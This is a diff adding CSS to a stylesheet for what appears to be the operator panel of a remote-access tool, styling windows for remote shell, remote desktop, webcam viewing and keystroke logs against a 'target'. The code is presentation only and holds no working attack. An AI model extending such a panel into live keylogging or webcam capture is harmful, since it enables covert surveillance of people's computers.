@@ -592,3 +592,293 @@ button[disabled] { opacity: .4; cursor: not-allowed; }
   border: 1px solid var(--line-2);
   color: var(--muted);
 }
+/* ---------- shared window chrome: cmd / rdp / webcam / keylog ---------- */
+.window {
+  height: 100vh;
+  display: flex;
+  flex-direction: column;
+  background: var(--bg);
+  overflow: hidden;
+}
+.window .topbar {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 12px 20px;
+  flex-shrink: 0;
+  background: var(--bg-2);
+  border-bottom: 1px solid var(--line);
+  font-size: 12px;
+  color: var(--muted);
+  flex-wrap: wrap;
+}
+.window .topbar .dot {
+  width: 8px;
+  height: 8px;
+  border-radius: 50%;
+  background: var(--muted-2);
+  transition: background .2s, box-shadow .2s;
+}
+.window .topbar .dot.on {
+  background: var(--green);
+  box-shadow: 0 0 10px var(--green);
+}
+.window .topbar .target {
+  color: var(--text);
+  font-family: var(--mono);
+  font-size: 12px;
+}
+.window .topbar .spacer { flex: 1; }
+.window .topbar .fps {
+  font-family: var(--mono);
+  font-size: 12px;
+  color: var(--text-2);
+  min-width: 68px;
+  text-align: right;
+  font-weight: 600;
+}
+.window .topbar .lbl {
+  font-size: 10px;
+  letter-spacing: .14em;
+  text-transform: uppercase;
+  color: var(--muted-2);
+  font-weight: 600;
+}
+.window .topbar select,
+.window .topbar button {
+  margin: 0;
+  padding: 7px 14px;
+  font-size: 12px;
+  font-weight: 600;
+  width: auto;
+  background: var(--panel-3);
+  border: 1px solid var(--line-2);
+  color: var(--text);
+  border-radius: var(--r-md);
+  cursor: pointer;
+  font-family: inherit;
+  transition: background .15s, border-color .15s;
+}
+.window .topbar select:hover,
+.window .topbar button:hover:not([disabled]) {
+  background: var(--panel-2);
+  border-color: var(--line-3);
+}
+.window .topbar button.active {
+  background: var(--text);
+  border-color: var(--text);
+  color: var(--bg);
+}
+.window .topbar select { padding-right: 30px; }
+
+/* fps slider */
+.window .topbar input[type=range] {
+  -webkit-appearance: none;
+  appearance: none;
+  height: 3px;
+  background: var(--line-2);
+  border-radius: 2px;
+  outline: none;
+  cursor: pointer;
+  width: 120px;
+  padding: 0;
+  border: none;
+  box-shadow: none;
+}
+.window .topbar input[type=range]::-webkit-slider-thumb {
+  -webkit-appearance: none;
+  appearance: none;
+  width: 12px;
+  height: 12px;
+  border-radius: 50%;
+  background: var(--text);
+  cursor: pointer;
+}
+.window .topbar input[type=range]::-moz-range-thumb {
+  width: 12px;
+  height: 12px;
+  border-radius: 50%;
+  background: var(--text);
+  border: none;
+  cursor: pointer;
+}
+.window .topbar .fps-val {
+  font-family: var(--mono);
+  font-size: 12px;
+  color: var(--text-2);
+  min-width: 22px;
+  font-weight: 600;
+}
+
+/* button variants inside topbar */
+.window .topbar button.danger {
+  border-color: rgba(248,113,113,.35);
+  color: var(--red);
+}
+.window .topbar button.danger:hover:not([disabled]) {
+  background: rgba(248,113,113,.08);
+  border-color: var(--red);
+  color: var(--red);
+}
+
+/* shell tabs (cmd / powershell) */
+.shelltabs {
+  display: flex;
+  gap: 2px;
+  background: var(--bg-2);
+  border: 1px solid var(--line);
+  border-radius: var(--r-md);
+  padding: 3px;
+}
+.shelltabs button {
+  margin: 0;
+  padding: 6px 14px;
+  font-size: 12px;
+  font-weight: 600;
+  font-family: var(--mono);
+  background: transparent;
+  border: 1px solid transparent;
+  color: var(--muted);
+  cursor: pointer;
+  border-radius: var(--r-sm);
+  width: auto;
+}
+.shelltabs button.active {
+  background: var(--panel-3);
+  border-color: var(--line-2);
+  color: var(--text);
+}
+.shelltabs button:hover:not(.active) { color: var(--text-2); }
+
+/* ---------- cmd / keylog terminal ---------- */
+.term {
+  flex: 1;
+  overflow-y: auto;
+  padding: 20px 24px;
+  font-family: var(--mono);
+  font-size: 13px;
+  line-height: 1.6;
+  color: var(--text);
+  background: var(--bg);
+}
+.term .blk {
+  margin-bottom: 14px;
+  padding: 12px 16px;
+  background: var(--panel);
+  border: 1px solid var(--line);
+  border-radius: var(--r-md);
+}
+.term .blk .cmdline {
+  color: var(--text-2);
+  word-break: break-all;
+  white-space: pre-wrap;
+  font-weight: 500;
+}
+.term .blk .cmdline .prompt { color: var(--muted); margin-right: 6px; }
+.term .blk .out {
+  color: var(--text);
+  white-space: pre-wrap;
+  word-break: break-word;
+  margin-top: 8px;
+  padding-top: 8px;
+  border-top: 1px dashed var(--line);
+}
+.term .blk .status {
+  color: var(--muted);
+  font-size: 11px;
+  margin-top: 8px;
+  display: flex;
+  gap: 10px;
+  align-items: center;
+}
+.term .blk .status.pending::before {
+  content: "";
+  display: inline-block;
+  width: 6px;
+  height: 6px;
+  border-radius: 50%;
+  border: 2px solid var(--text);
+  border-top-color: transparent;
+  animation: spin .7s linear infinite;
+}
+.term .blk .status.err { color: var(--red); }
+@keyframes spin { to { transform: rotate(360deg); } }
+.term .empty { color: var(--muted); padding: 40px; text-align: center; font-size: 12px; }
+
+/* command bar */
+.cmdbar {
+  flex-shrink: 0;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 14px 20px;
+  border-top: 1px solid var(--line);
+  background: var(--bg-2);
+}
+.cmdbar .ps1 {
+  color: var(--muted);
+  font-family: var(--mono);
+  font-size: 13px;
+  font-weight: 600;
+}
+.cmdbar input {
+  flex: 1;
+  background: transparent;
+  border: none;
+  color: var(--text);
+  font-family: var(--mono);
+  font-size: 13px;
+  padding: 6px 0;
+  margin: 0;
+  outline: none;
+  border-radius: 0;
+}
+.cmdbar input:focus { background: transparent; border: none; }
+
+/* ---------- rdp / webcam stage ---------- */
+.stage {
+  flex: 1;
+  overflow: auto;
+  display: grid;
+  place-items: center;
+  background: var(--bg);
+  padding: 20px;
+  position: relative;
+}
+.stage img {
+  max-width: 100%;
+  max-height: 100%;
+  background: #000;
+  border: 1px solid var(--line);
+  border-radius: var(--r-md);
+  user-select: none;
+  -webkit-user-drag: none;
+  outline: none;
+  cursor: crosshair;
+}
+.stage .wait { color: var(--muted); font-size: 12px; }
+
+/* keylog log view */
+.log {
+  flex: 1;
+  overflow-y: auto;
+  padding: 20px 24px;
+  font-family: var(--mono);
+  font-size: 13px;
+  line-height: 1.65;
+  color: var(--text);
+  background: var(--bg);
+  white-space: pre-wrap;
+  word-break: break-word;
+}
+.log .chunk {
+  margin-bottom: 10px;
+  padding: 10px 14px;
+  background: var(--panel);
+  border: 1px solid var(--line);
+  border-left: 2px solid var(--line-2);
+  border-radius: var(--r-md);
+  transition: border-left-color .15s;
+}
+.log .chunk:hover { border-left-color: var(--accent); }
+.log .t { color: var(--muted); font-size: 11px; font-weight: 600; }
